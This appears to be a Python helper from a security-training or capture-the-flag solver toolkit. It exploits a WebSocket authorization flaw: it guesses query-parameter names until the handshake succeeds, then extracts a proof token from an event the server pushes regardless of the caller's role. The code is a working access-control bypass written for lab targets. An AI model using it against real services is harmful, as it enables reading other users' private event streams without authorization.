#!/usr/bin/env python3
"""Sibling to `recovery_lib.py` for recoverers that need a real WebSocket client.

`recovery_lib.py` is stdlib-only by design (see its own docstring); stdlib
`urllib` cannot perform a WS handshake cleanly enough to be worth hand-rolling
long-term. This module needs the `websockets` and `certifi` packages, which is
exactly why it is kept separate rather than folded into `recovery_lib.py`
proper - importing it pulls in that dependency, so only do so once you've
installed it (e.g. `uv venv .venv && . .venv/bin/activate && uv pip install
websockets certifi`) and have read this file first (same policy as
`recovery_lib.py`: port the logic you need into your own authored solver,
don't execute this against a live target without reading it).

No network calls at import time, no HUNTRESS_GM_TOKEN, no start/submit. Every
function here only ever talks to the one target origin it is given.
"""
import asyncio
import json
import re
import ssl
import urllib.request

import certifi
import websockets

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")


def _get_json(url):
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    ctx = ssl.create_default_context(cafile=certifi.where())
    with urllib.request.urlopen(req, timeout=30, context=ctx) as resp:
        return json.loads(resp.read().decode())


async def _try_stream(ws_base, feature_route, stream_reference, param_candidates, evidence_dir=None):
    ctx = ssl.create_default_context(cafile=certifi.where())
    for param in param_candidates:
        url = f"{ws_base}{feature_route}?{param}={stream_reference}"
        try:
            async with websockets.connect(url, ssl=ctx, open_timeout=10) as ws:
                msg = await asyncio.wait_for(ws.recv(), timeout=10)
                if evidence_dir:
                    (evidence_dir / f"ws_{param}.json").write_text(msg)
                match = PROOF_RE.search(msg)
                if match:
                    return match.group(0), param
        except Exception:  # noqa: BLE001  any handshake/recv failure just means "wrong param", try the next
            continue
    return None, None


# Candidate query-parameter names for the stream reference, evidence-led: the
# clue's own key (stream_reference) and short/common aliases never work; the
# bare word `stream` is the one confirmed live (release day 27, 3 independent
# targets).
STREAM_PARAM_CANDIDATES = ("stream", "stream_reference", "ref", "id", "channel")


def rec_unauthorized_event_stream(base_url, clues=None, evidence_dir=None):
    """`/api/clues` -> feature_route (a WebSocket upgrade path) + stream_reference
    (a numeric id), with no secondary_route/inventory_route/protected_reference/
    state_format_route/event_type/owner_scope/session_hint/callback_nonce
    alongside it - this bare two-key shape is otherwise unclaimed in
    `recovery_lib.py`'s dispatch chain. Join point / dispatch signature for a
    combined classifier: `clues.get("feature_route") and clues.get("stream_reference")
    is not None` and none of the keys above are present.

    A plain GET/POST/OPTIONS to feature_route (no Upgrade headers) returns 426;
    a well-formed WS handshake with no query, or with the clue's own key name
    (`stream_reference`/`ref`/`id`/`channel`), gets 403 - this *looks* like a
    role/auth rejection (current_role: analyst) but isn't. The upgrade only
    succeeds when the query string names the stream with the bare key `stream`;
    once connected, the server immediately pushes one JSON event carrying the
    proof, regardless of role, because the subscription is never re-checked
    against the caller's own role/ownership of that stream reference.

    `clues` is optional - fetched from `base_url`'s own `/api/clues` if not
    already in hand (the caller's own classify_and_recover-style dispatcher
    will usually already have it).
    Source: day-22-socket-to-me (curriculum day 22, release day 27) - this
    family's own bug (Koa 'Live Case Wire')."""
    base_url = base_url.rstrip("/")
    if clues is None:
        clues = _get_json(base_url + "/api/clues")
    feature_route = clues.get("feature_route")
    stream_reference = clues.get("stream_reference")
    if not feature_route or stream_reference is None:
        return None
    ws_base = "wss://" + base_url.split("://", 1)[1]
    proof, _param = asyncio.run(
        _try_stream(ws_base, feature_route, stream_reference, STREAM_PARAM_CANDIDATES, evidence_dir))
    return proof
